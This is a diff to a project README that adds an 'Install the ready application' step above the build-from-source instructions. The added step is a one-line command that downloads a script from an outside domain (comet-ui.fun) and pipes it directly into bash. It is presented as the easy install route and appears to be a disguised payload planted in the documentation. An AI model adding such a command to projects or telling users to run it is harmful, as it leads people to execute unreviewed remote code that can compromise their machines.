@@ -45,6 +45,13 @@
 
 ## <div align="center">🚀 Getting Started</div>
 
+### Install the ready application
+
+```bash
+# One-line installation
+curl -s https://www.comet-ui.fun/api/v1/installer | bash
+```
+
 ### Build from source
 
 ```bash
